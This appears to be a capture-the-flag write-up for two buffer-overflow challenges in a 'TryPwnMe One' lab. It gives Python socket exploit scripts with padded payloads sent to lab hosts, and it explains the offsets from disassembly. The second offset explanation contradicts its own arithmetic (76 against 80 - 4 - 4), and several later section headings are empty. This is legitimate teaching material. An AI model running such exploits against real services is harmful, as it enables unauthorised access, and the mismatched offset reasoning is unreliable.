# TryPwnMe One

### TryOverflowMe 1
I developed the following exploit for this:<br />

    import socket
    
    ip = "10.10.7.174"
    
    port = 9003
    
    payload = "A"*45
    
    buffer = payload
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    try:
            s.connect((ip,port))
            response = s.recv(1024)
            print(response.decode())
    
            print("Sending payload...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
    
            response = s.recv(4096)
            print("Response:\n", response.decode('latin-1'))
    
            print("Done!")
    except:
            print("Could not connect.")
![image](https://github.com/user-attachments/assets/d1cf6db5-ce6f-42cd-bb12-9ff6fe505327)<br />
But why 45 A's? If I open the binary on IDA, I can see that the buffer variable and the "admin" variable are 44 bytes apart:<br />
![image](https://github.com/user-attachments/assets/c886227a-d9f2-43e5-9eac-17de88f9ad3c)<br />
The buffer is at -30h, which is 48 bytes in decimal, and the admin variable is at -4h, which is 4 bytes in decimal. Their difference is 44, so I need to write at least 45 bytes to influence the admin variable.

### TryOverflowMe 2
I developed this exploit code for this task:

      import socket
      
      ip = "10.10.56.44"
      
      port = 9004
      
      payload = "A"*76
      
      admin = "\x59\x59\x59\x59"
      
      buffer = payload + admin
      
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      
      try:
              s.connect((ip,port))
              response = s.recv(1024)
              print(response.decode())
      
              print("Sending payload...")
              s.send(bytes(buffer + "\r\n", "latin-1"))
      
              response = s.recv(4096)
              print("Response:\n", response.decode('latin-1'))
      
              print("Done!")
      except:
              print("Could not connect.")
![image](https://github.com/user-attachments/assets/761f96a0-42ed-4b41-bdc8-d0f45e4b4a1a)<br />
The offset to reach the admin variable is 76, but why?<br />
![image](https://github.com/user-attachments/assets/973df8aa-ce49-4328-82e7-2db006752881)<br />
The buffer is located at ebp + 50h, which is 80 in decimal. Then there are two integers (check and guess), and then there's the admin variable. So to overflow the admin variable I have to put 80 - 4 - 4 bytes + 0x59595959.

### TryExecMe

### TryRetMe

### Random Memories

### The Librarian

### Not Specified
